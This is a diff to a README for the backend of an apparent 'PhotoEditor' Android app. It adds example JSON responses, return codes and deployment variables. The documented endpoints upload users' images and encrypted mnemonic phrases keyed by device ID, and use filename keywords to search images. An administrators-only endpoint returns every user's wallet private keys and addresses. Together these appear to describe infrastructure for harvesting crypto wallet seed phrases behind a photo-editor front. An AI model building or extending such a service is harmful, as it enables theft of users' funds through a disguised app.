@@ -170,6 +170,14 @@ sequenceDiagram
     - Response:
         - `status`: The status of the request.
         - `message`: The message of the request.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Pong!"
+    }
+    ```
 
 ### Basic Endpoints
 
@@ -181,27 +189,59 @@ sequenceDiagram
         - `Content-Type`: The MIME type of the image (e.g., `image/jpeg`, `image/png`).
         - `userId`: The user ID (sent as a custom header).
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
-        - `valid`: The validity of mnemonic phrase from the image.
         - `message`: The message of the request.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Image uploaded successfully."
+    }
+    ```
 - `POST /basic/mnemonic-upload`
     - Uploads the mnemonic phrase to the server.
     - Request Body:
         - `userId`: The user ID (same as the `ANDROID_ID`).
         - `mnemonicPhase`: The encrypted mnemonic phrase.
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
-        - `valid`: The validity of the mnemonic phrase.
         - `message`: The message of the request.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Mnemonic uploaded successfully."
+    }
+    ```
 - `POST /basic/wallet-credential-download`
-    - Downloads the wallet credential from the server.
-    - **Administrators Only**: Request Parameters:
+    - **Administrators Only**: Downloads the wallet credential from the server.
+    - Request Parameters:
         - `startDateTime`: (Optional) The start date and time of the request.
         - `endDateTime`: (Optional) The end date and time of the request.
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
         - `message`: The message of the request.
-        - `mnemonicPhase`: The mnemonic phrase.
+        - `data`: The wallet credential data.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Wallet credential data downloaded successfully.",
+        "data": [
+            {
+                "userId": "1234567890",
+                "privateKey": "0x1234567890",
+                "walletAddress": "0x1234567890"
+            }
+        ]
+    }
+    ```
 - `POST /basic/image-edit-info-upload`
     - **Administrators Only**: Uploads the image edit information to the server.
     - Request Body:
@@ -209,8 +249,17 @@ sequenceDiagram
         - `fileName`: The name of the image file.
         - `editInfo`: The image edit information.
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
         - `message`: The message of the request.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Image edit information uploaded successfully."
+    }
+    ```
 - `GET /basic/image-download`
     - Downloads an image from the server.
     - Request Parameters:
@@ -223,9 +272,21 @@ sequenceDiagram
 - `GET /basic/latest-version`
     - Gets the latest version of the application.
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
         - `message`: The message of the request.
-        - `version`: The version of the application.
+        - `data`: The latest version of the application.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Latest version downloaded successfully.",
+        "data": {
+            "version": "1.0.0"
+        }
+    }
+    ```
 - `GET /basic/latest-release`
     - Gets the latest release of the application.
     - Response Body:
@@ -238,66 +299,161 @@ sequenceDiagram
         - `fileName`: The name of the image file.
         - `userId`: The user ID (same as the `ANDROID_ID`).
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
         - `message`: The message of the request.
-        - `editInfo`: The image edit information.
+        - `data`: The image edit information.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Image edit information downloaded successfully.",
+        "data": [
+            {
+                "areaId": 1,
+                "coordinates": {"x": 50, "y": 50, "width": 200, "height": 100},
+                "font": "Arial",
+                "fontSize": 12,
+                "text": "Hello, World!"
+            },
+            {
+                "areaId": 2,
+                "coordinates": {"x": 60, "y": 80, "width": 150, "height": 90},
+                "font": "Times New Roman",
+                "fontSize": 14,
+                "text": "This is a sample text."
+            }
+        ]
+    }
+    ```
 - `POST /basic/user-activation`
     - Activates the entire functionality of the application.
     - Request Body:
-        - `activationCode`: The activation code.
+        - `userId`: The user ID (same as the `ANDROID_ID`).
+        - `transactionHash`: The transaction hash which is served as the activation code.
+    - Response:
+        - `code`: The status code of the request.
+        - `status`: The status of the request.
+        - `message`: The message of the request.
+        - `data`: The data of the response.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "User activated successfully.",
+        "data": {
+            "valid": true,
+            "expirationDate": "2022-12-31T23:59:59.999Z"
+        }
+    }
+    ```
+- `GET /basic/check-activation`
+    - Checks the activation code.
+    - Request Parameters:
         - `userId`: The user ID (same as the `ANDROID_ID`).
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
-        - `valid`: The validity of the activation code.
-        - `expirationDate`: The expiration date of the activation code, null if the activation code is invalid.
         - `message`: The message of the request.
+        - `data`: The data of the response.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Activation code is valid.",
+        "data": {
+            "valid": true,
+            "expirationDate": "2022-12-31T23:59:59.999Z"
+        }
+    }
+    ```
 - `GET /basic/filename-keywords-download`
     - Return the keywords as search filters for the image filename.
     - Request Parameters:
         - `userId`: The user ID (same as the `ANDROID_ID`).
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
         - `message`: The message of the request.
-        - `keywords`: The keywords to be used as search filters for the image.
+        - `data`: The data of the response.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Keywords downloaded successfully.",
+        "data": [
+            "keyword1",
+            "keyword2",
+            "keyword3"
+        ]
+    }
+    ```
 - `POST /basic/filename-keywords-upload`
     - **Administrators Only**: Upload the keywords as search filters for the image filename.
     - Request Body:
         - `token`: The token of the administrator.
         - `keywords`: The keywords to be used as search filters for the image.
     - Response:
+        - `code`: The status code of the request.
         - `status`: The status of the request.
         - `message`: The message of the request.
+    - Example:
+    ```json
+    {
+        "code": 0,
+        "status": "success",
+        "message": "Keywords uploaded successfully."
+    }
+    ```
 
 ### API Endpoints
 
 Need to be updated.
 
-## Examples
+## Return Code
 
-### Image edit information example
+Return code includes two parts: code and message, which are used to indicate the information returned by the HTTP API.
 
-```json
-{
-    "status": "success",
-    "message": "Image edit information uploaded successfully.",
-    "editInfo": [
-        {
-            "areaId": 1,
-            "coordinates": {"x": 50, "y": 50, "width": 200, "height": 100},
-            "font": "Arial",
-            "fontSize": 12,
-            "text": "Hello, World!"
-        },
-        {
-            "areaId": 2,
-            "coordinates": {"x": 60, "y": 80, "width": 150, "height": 90},
-            "font": "Times New Roman",
-            "fontSize": 14,
-            "text": "This is a sample text."
-        }
-    ]
-}
-```
+All possible return codes are as follows:
+
+| Code    | Message                                                     |
+| ------- | ----------------------------------------------------------- |
+| `0`     | Success                                                     |
+| `10000` | Unknown error                                               |
+| `10001` | Wrong params                                                |
+| `10002` | Authentication failed                                       |
+| `10003` | No session found                                            |
+| `10004` | Address not found in request param or invalid address       |
+| `10005` | User id not found in request param or invalid user id       |
+| `10006` | Required file not found in request or invalid file          |
+| `10007` | Failed to upload file to backblaze b2 cloud storage         |
+| `10008` | Failed to download file from backblaze b2 cloud storage     |
+| `10009` | File not found                                              |
+| `10010` | Error logging upload to MongoDB                             |
+| `10011` | Error logging download to MongoDB                           |
+| `10012` | Error logging mnemonic phrase to MongoDB                    |
+| `10013` | Failed to fetch the latest version from the GitHub repository |
+| `10014` | Server error while fetching the latest version from the GitHub repository |
+| `10015` | Failed to upload the image edit info                        |
+| `10016` | Required file name or edit info not found in request or invalid |
+| `10017` | Invalid mnemonic phrase                                     |
+| `10018` | Failed to fetch the latest release from the GitHub repository |
+| `10019` | Release file not found                                      |
+| `10020` | Server error while fetching the latest release from the GitHub repository |
+| `10021` | Failed to search keywords                                   |
+| `10022` | Missing keywords                                            |
+| `10023` | Error storing image edit info to MongoDB                    |
+| `10024` | Error fetching image edit info from MongoDB                 |
+| `10025` | Error uploading keywords to MongoDB                         |
+| `10026` | Error fetching keywords from MongoDB                        |
+| `10027` | Error fetching wallet credentials info from MongoDB         |
+| `10028` | Error fetching transaction info                             |
+| `10029` | Error checking user activation status                       |
+| `10030` | User not activated                                          |
 
 ## Installation and Setup
 
@@ -317,6 +473,15 @@ Need to be updated.
     MONGODB_PASSWORD="your_mongodb_password"
     MONGODB_PORT="your_mongodb_port"
     MONGODB_DB="your_mongodb_name"
+    ENCRYPTION_KEY="your_encryption_key"
+    GITHUB_OWNER=BTI-US
+    GITHUB_REPO=PhotoEditor
+    GITHUB_TOKEN="your_github_token"
+    RELEASE_NAME=release.apk
+    INFURA_PROJECT_ID="your_infura_project_id"
+    CONTRACT_ADDRESS="your_contract_address"
+    ETHEREUM_NETWORK="your_ethereum_network"
+    EXPIRATION_TIME_PERIOD="your_expiration_time_period_day"
     ```
 
 ### Building the Docker Image
@@ -374,6 +539,15 @@ CERT_PATH=/etc/ssl/certs/fullchain2.pem \
 PRIVKEY_PATH=/etc/ssl/certs/privkey2.pem \
 HOST_CERT_FOLDER=/etc/letsencrypt/archive/btiplatform.com \
 CONTAINER_CERT_FOLDER=/etc/ssl/certs \
+ENCRYPTION_KEY="your_encryption_key" \
+GITHUB_OWNER=BTI-US \
+GITHUB_REPO=PhotoEditor \
+GITHUB_TOKEN="your_github_token" \
+RELEASE_NAME=release.apk \
+INFURA_PROJECT_ID="your_infura_project_id" \
+CONTRACT_ADDRESS="your_contract_address" \
+ETHEREUM_NETWORK="your_ethereum_network" \
+EXPIRATION_TIME_PERIOD="your_expiration_time_period_day" \
 docker-compose up -d
 ```
 
@@ -391,6 +565,15 @@ CERT_PATH=/etc/ssl/certs/fullchain2.pem \
 PRIVKEY_PATH=/etc/ssl/certs/privkey2.pem \
 HOST_CERT_FOLDER=/etc/letsencrypt/archive/btiplatform.com \
 CONTAINER_CERT_FOLDER=/etc/ssl/certs \
+ENCRYPTION_KEY="your_encryption_key" \
+GITHUB_OWNER=BTI-US \
+GITHUB_REPO=PhotoEditor \
+GITHUB_TOKEN="your_github_token" \
+RELEASE_NAME=release.apk \
+INFURA_PROJECT_ID="your_infura_project_id" \
+CONTRACT_ADDRESS="your_contract_address" \
+ETHEREUM_NETWORK="your_ethereum_network" \
+EXPIRATION_TIME_PERIOD="your_expiration_time_period_day" \
 docker-compose down
 ```
 
